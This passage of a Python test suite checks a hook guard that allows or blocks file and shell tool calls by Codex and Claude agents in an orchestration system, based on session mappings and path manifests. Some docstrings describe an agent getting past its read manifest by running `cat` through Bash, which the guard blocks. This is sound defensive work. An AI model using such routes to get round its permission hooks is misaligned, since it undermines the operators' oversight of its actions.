                        json.dumps(payload),
                    ]
                )
            self.assertEqual(code, 0)

    def test_codex_file_tool_blocks_when_session_run_index_is_ambiguous(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_index_ambiguous_001"
            session_id = "sess_step_build_index_ambiguous_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            orch_root.mkdir(parents=True, exist_ok=True)
            (orch_root / "session_run_index.json").write_text(
                json.dumps(
                    {
                        "entries": [
                            {
                                "agent_run_id": "step_run_ambiguous_001",
                                "agent_session_id": session_id,
                                "session_id": session_id,
                                "agent_role": "step",
                                "status": "running",
                            },
                            {
                                "agent_run_id": "step_run_ambiguous_002",
                                "agent_session_id": session_id,
                                "session_id": session_id,
                                "agent_role": "step",
                                "status": "running",
                            },
                        ]
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "session_id": session_id,
                "tool_input": {"file_path": "workspace/pipelines/safe/out.txt"},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("session-to-run mapping not found", body.get("reason", ""))
            self.assertIn("ambiguous candidates=2", body.get("reason", ""))

    def test_codex_file_tool_resolves_in_place_resume_to_running_owner(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_in_place_resume_001"
            session_id = "thread_in_place_resume_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            orch_root.mkdir(parents=True, exist_ok=True)
            (orch_root / "session_run_index.json").write_text(
                json.dumps({"entries": [
                    {"agent_run_id": "prior_run", "agent_session_id": session_id,
                     "session_id": session_id, "status": "fail"},
                    {"agent_run_id": "repair_run", "agent_session_id": session_id,
                     "session_id": session_id, "status": "running"},
                ]}),
                encoding="utf-8",
            )
            resolved, candidates = cli._resolve_codex_agent_run_id_from_session(
                repo_root=repo_root, orchestration_id=orch,
                session_id=session_id, agent_session_id=None,
            )
            self.assertEqual(resolved, "repair_run")
            self.assertEqual(candidates, 1)

    def test_codex_file_tool_does_not_match_none_literal_from_missing_context_id(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_index_none_literal_001"
            run_id = "step_run_none_literal_001"
            target = "workspace/pipelines/safe/out.txt"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "session_run_index.json").write_text(
                json.dumps(
                    {
                        "entries": [
                            {
                                "agent_run_id": run_id,
                                "agent_session_id": "sess_real_001",
                                "context_id": None,
                                "agent_role": "step",
                                "status": "running",
                            }
                        ]
                    }
                ),
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [target],
                        "allowed_file_tool_paths": [target],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "session_id": "None",
                "tool_input": {"file_path": target},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("session-to-run mapping not found", body.get("reason", ""))

    def test_codex_file_tool_blocks_when_session_mapping_not_found(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_003"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            orch_root.mkdir(parents=True, exist_ok=True)
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Read",
                "session_id": "sess_unknown_001",
                "tool_input": {"file_path": "workspace/pipelines/safe/out.txt"},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("session-to-run mapping not found", body.get("reason", ""))
            self.assertIn("orchestration_read", body.get("reason", ""))

    def test_codex_write_tool_blocks_with_write_hint_when_session_mapping_not_found(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_004"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            orch_root.mkdir(parents=True, exist_ok=True)
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "session_id": "sess_unknown_002",
                "tool_input": {"file_path": "workspace/pipelines/safe/out.txt"},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("session-to-run mapping not found", body.get("reason", ""))
            self.assertIn("Edit/Write", body.get("reason", ""))
            self.assertNotIn("orchestration_read", body.get("reason", ""))

    def test_codex_raw_apply_patch_allows_when_target_is_in_allowed_file_tool_paths(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_apply_patch_guard_001"
            run_id = "step_run_apply_patch_001"
            session_id = "sess_apply_patch_001"
            target_path = "workspace/pipelines/safe/notes.md"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "agent_runs.jsonl").write_text(
                json.dumps(
                    {
                        "agent_run_id": run_id,
                        "agent_backend": "codex",
                        "agent_session_id": session_id,
                    }
                )
                + "\n",
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [target_path],
                        "allowed_file_tool_paths": [target_path],
                        "write_roots": ["workspace/pipelines/safe"],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "session_id": session_id,
                "tool_input": {
                    "command": (
                        "*** Begin Patch\n"
                        f"*** Add File: {target_path}\n"
                        "+notes\n"
                        "*** End Patch\n"
                    )
                },
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 0)
            body_text = out.getvalue().strip()
            if body_text:
                body = json.loads(body_text)
                self.assertEqual(body.get("decision"), "allow")
            log_path = (
                repo_root
                / "workspace"
                / "orchestrations"
                / orch
                / "hooks"
                / "native_hook_events.jsonl"
            )
            entry = json.loads(log_path.read_text(encoding="utf-8").splitlines()[-1])
            self.assertEqual(entry.get("tool_name"), "apply_patch")
            self.assertEqual(
                entry.get("payload_summary", {}).get("apply_patch_paths"),
                [target_path],
            )
            self.assertEqual(entry.get("payload_summary", {}).get("patch_line_count"), 4)

    def test_codex_raw_apply_patch_allows_when_session_id_matches_context_id(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_apply_patch_guard_001_context_fallback"
            run_id = "step_run_apply_patch_context_001"
            context_id = "ctx_apply_patch_001"
            target_path = "workspace/pipelines/safe/spec.ir.yaml"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "agent_runs.jsonl").write_text(
                json.dumps(
                    {
                        "agent_run_id": run_id,
                        "agent_backend": "codex",
                        "agent_session_id": "sess_unrelated_001",
                        "context_id": context_id,
                    }
                )
                + "\n",
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [target_path],
                        "allowed_file_tool_paths": [target_path],
                        "write_roots": ["workspace/pipelines/safe"],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "session_id": context_id,
                "tool_input": {
                    "patch": (
                        "*** Begin Patch\n"
                        f"*** Add File: {target_path}\n"
                        "+case: resolved\n"
                        "*** End Patch\n"
                    )
                },
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 0)
            body_text = out.getvalue().strip()
            if body_text:
                body = json.loads(body_text)
                self.assertEqual(body.get("decision"), "allow")

    def test_codex_raw_apply_patch_blocks_when_context_id_mapping_is_ambiguous(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_apply_patch_guard_ambiguous_context"
            context_id = "ctx_apply_patch_ambiguous_001"
            target_path = "workspace/pipelines/safe/spec.ir.yaml"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "agent_runs.jsonl").write_text(
                "\n".join(
                    [
                        json.dumps(
                            {
                                "agent_run_id": "step_run_apply_patch_context_ambiguous_001",
                                "agent_backend": "codex",
                                "agent_session_id": "sess_unrelated_ambiguous_001",
                                "context_id": context_id,
                            }
                        ),
                        json.dumps(
                            {
                                "agent_run_id": "step_run_apply_patch_context_ambiguous_002",
                                "agent_backend": "codex",
                                "agent_session_id": "sess_unrelated_ambiguous_002",
                                "context_id": context_id,
                            }
                        ),
                    ]
                )
                + "\n",
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "session_id": context_id,
                "tool_input": {
                    "patch": (
                        "*** Begin Patch\n"
                        f"*** Add File: {target_path}\n"
                        "+case: ambiguous\n"
                        "*** End Patch\n"
                    )
                },
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("session-to-run mapping not found", body.get("reason", ""))

    def test_codex_raw_apply_patch_audit_logs_target_paths(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_apply_patch_audit_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            orch_root.mkdir(parents=True, exist_ok=True)
            patch_text = "\n".join(
                [
                    "*** Begin Patch",
                    "*** Add File: workspace/ir/p/ir_meta.json",
                    "+{}",
                    "*** Update File: workspace/ir/p/spec.ir.yaml",
                    "@@",
                    "+case: ok",
                    "*** End Patch",
                    "",
                ]
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "tool_input": {"patch": patch_text},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            log_path = (
                repo_root
                / "workspace"
                / "orchestrations"
                / orch
                / "hooks"
                / "native_hook_events.jsonl"
            )
            entry = json.loads(log_path.read_text(encoding="utf-8").splitlines()[-1])
            self.assertEqual(
                entry.get("payload_summary", {}).get("apply_patch_paths"),
                [
                    "workspace/ir/p/ir_meta.json",
                    "workspace/ir/p/spec.ir.yaml",
                ],
            )
            self.assertNotIn("patch", entry.get("payload_summary", {}))

    def test_codex_raw_apply_patch_blocks_when_session_mapping_not_found(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_apply_patch_guard_allow_unresolved"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            orch_root.mkdir(parents=True, exist_ok=True)
            target_path = "workspace/pipelines/safe/spec.ir.yaml"
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "session_id": "sess_apply_patch_unresolved_001",
                "tool_input": {
                    "patch": (
                        "*** Begin Patch\n"
                        f"*** Add File: {target_path}\n"
                        "+case: unresolved-allow\n"
                        "*** End Patch\n"
                    )
                },
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("session-to-run mapping not found", body.get("reason", ""))
            self.assertIn("Edit/Write", body.get("reason", ""))

    def test_bash_audit_redacts_capability_token(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_audit_redact_001"
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "tool_input": {
                    "command": (
                        "python3 tools/orchestration_runtime.py guarded-apply-patch "
                        "--capability-token secret-token-123"
                    )
                },
            }
            with patch.dict(
                os.environ,
                {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                code = cli.main(
                    [
                        "--backend",
                        "codex",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
            # A Codex PreToolUse file-access event without a session mapping
            # must fail closed; audit logging still redacts the token.
            self.assertEqual(code, 2)
            log_path = (
                repo_root
                / "workspace"
                / "orchestrations"
                / orch
                / "hooks"
                / "native_hook_events.jsonl"
            )
            entry = json.loads(log_path.read_text(encoding="utf-8").splitlines()[-1])
            command_summary = entry.get("payload_summary", {}).get("command", "")
            self.assertIn("--capability-token <redacted>", command_summary)
            self.assertNotIn("secret-token-123", command_summary)

    def test_claude_file_tool_allows_orchestration_agent_write_when_path_is_allowed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_005"
            run_id = "orch_agent_001"
            allowed_path = "workspace/pipelines/safe/out.txt"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "orchestration_meta.json").write_text(
                json.dumps({"orchestration_agent_run_id": run_id}, ensure_ascii=False),
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [allowed_path],
                        "allowed_file_tool_paths": [allowed_path],
                        "write_roots": ["workspace/pipelines/safe"],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "tool_input": {"file_path": allowed_path},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 0)
            body_text = out.getvalue().strip()
            self.assertTrue(body_text, "hook must emit hookSpecificOutput for permission auto-approve")
            body = json.loads(body_text)
            hso = body.get("hookSpecificOutput") or {}
            self.assertEqual(hso.get("permissionDecision"), "allow")
            self.assertEqual(hso.get("hookEventName"), "PreToolUse")

    def test_claude_file_tool_allows_orchestration_agent_edit_failure_analysis_json(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_failure_analysis_001"
            run_id = "orch_agent_failure_analysis_001"
            target_path = f"workspace/orchestrations/{orch}/failure_analysis.json"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "orchestration_meta.json").write_text(
                json.dumps({"orchestration_agent_run_id": run_id}, ensure_ascii=False),
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [target_path],
                        "allowed_file_tool_paths": [target_path],
                        "write_roots": [f"workspace/orchestrations/{orch}"],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Edit",
                "tool_input": {"file_path": target_path},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 0)
            body_text = out.getvalue().strip()
            self.assertTrue(body_text, "hook must emit hookSpecificOutput for permission auto-approve")
            body = json.loads(body_text)
            hso = body.get("hookSpecificOutput") or {}
            self.assertEqual(hso.get("permissionDecision"), "allow")
            self.assertEqual(hso.get("hookEventName"), "PreToolUse")

    def test_claude_raw_apply_patch_allows_when_failure_analysis_json_is_in_allowlist(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_failure_analysis_002"
            run_id = "orch_agent_failure_analysis_002"
            target_path = f"workspace/orchestrations/{orch}/failure_analysis.json"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "orchestration_meta.json").write_text(
                json.dumps({"orchestration_agent_run_id": run_id}, ensure_ascii=False),
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [target_path],
                        "allowed_file_tool_paths": [target_path],
                        "write_roots": [f"workspace/orchestrations/{orch}"],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "tool_input": {
                    "patch": (
                        "*** Begin Patch\n"
                        f"*** Add File: {target_path}\n"
                        "+{}\n"
                        "*** End Patch\n"
                    )
                },
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 0)
            body_text = out.getvalue().strip()
            if body_text:
                body = json.loads(body_text)
                self.assertEqual(body.get("decision"), "allow")

    def test_claude_raw_apply_patch_blocks_when_target_not_in_allowed_file_tool_paths(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_failure_analysis_003"
            run_id = "orch_agent_failure_analysis_003"
            target_path = f"workspace/orchestrations/{orch}/failure_analysis.json"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "orchestration_meta.json").write_text(
                json.dumps({"orchestration_agent_run_id": run_id}, ensure_ascii=False),
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [target_path],
                        "allowed_file_tool_paths": [],
                        "write_roots": [f"workspace/orchestrations/{orch}"],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "tool_input": {
                    "patch": (
                        "*** Begin Patch\n"
                        f"*** Add File: {target_path}\n"
                        "+{}\n"
                        "*** End Patch\n"
                    )
                },
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("allowed_file_tool_paths", body.get("reason", ""))

    def test_claude_file_tool_blocks_when_active_agent_run_id_file_empty(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_006"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            orch_root.mkdir(parents=True, exist_ok=True)
            (orch_root / "active_child_agent_run_id.txt").write_text("   \n", encoding="utf-8")
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Read",
                "tool_input": {"file_path": "workspace/pipelines/safe/out.txt"},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("active child agent_run_id is empty", body.get("reason", ""))
            self.assertIn("orchestration_read", body.get("reason", ""))

    def test_claude_file_tool_blocks_orchestration_agent_write_when_path_not_in_file_tool_allowlist(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_006b"
            run_id = "orch_agent_006b"
            target_path = "workspace/pipelines/safe/failure_analysis.json"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "orchestration_meta.json").write_text(
                json.dumps({"orchestration_agent_run_id": run_id}, ensure_ascii=False),
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [target_path],
                        "allowed_file_tool_paths": [],
                        "write_roots": ["workspace/pipelines/safe"],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "tool_input": {"file_path": target_path},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("allowed_file_tool_paths", body.get("reason", ""))

    def test_claude_write_blocks_with_manifest_hint_when_output_manifest_invalid(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_007"
            run_id = "step_run_build_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "active_child_agent_run_id.txt").write_text(run_id, encoding="utf-8")
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                "{invalid-json",
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "tool_input": {"file_path": "workspace/pipelines/safe/out.txt"},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("invalid JSON", body.get("reason", ""))
            self.assertIn("Ensure record-launch generated the manifest", body.get("reason", ""))

    def test_codex_read_blocks_with_manifest_hint_when_read_manifest_missing(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_008"
            run_id = "step_run_build_001"
            session_id = "sess_step_build_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            orch_root.mkdir(parents=True, exist_ok=True)
            (orch_root / "agent_runs.jsonl").write_text(
                json.dumps(
                    {
                        "agent_run_id": run_id,
                        "agent_backend": "codex",
                        "agent_session_id": session_id,
                    }
                )
                + "\n",
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Read",
                "session_id": session_id,
                "tool_input": {"file_path": "workspace/pipelines/safe/out.txt"},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("read manifest not found", body.get("reason", ""))
            self.assertIn("Ensure record-launch generated the manifest", body.get("reason", ""))

    def test_codex_pure_bash_blocks_readonly_repository_command(self) -> None:
        """A pure Codex leaf must not bypass its empty read manifest via `cat`."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_pure_shell_001"
            run_id = "substep_run_pure_001"
            session_id = "thread_pure_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            cap_dir = orch_root / "capabilities"
            cap_dir.mkdir(parents=True, exist_ok=True)
            (cap_dir / f"{run_id}.json").write_text(
                json.dumps({"mode": "pure_readonly", "write_roots": []}),
                encoding="utf-8",
            )
            (orch_root / "agent_runs.jsonl").write_text(
                json.dumps({
                    "agent_run_id": run_id,
                    "agent_backend": "codex",
                    "agent_session_id": session_id,
                }) + "\n",
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "session_id": session_id,
                "tool_input": {"command": "cat workspace/pipelines/prior/source_meta.json"},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend", "codex", "--event", "PreToolUse",
                            "--input-json", json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("may not invoke Bash or Shell", body.get("reason", ""))

    def test_codex_unmapped_bash_blocks_before_readonly_auto_approval(self) -> None:
        """A missing Codex session index must not let `cat` bypass pure policy."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            payload = {
                "orchestration_id": "orch_unmapped_shell_001",
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "session_id": "unknown-thread",
                "tool_input": {"command": "cat workspace/pipelines/prior/source_meta.json"},
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
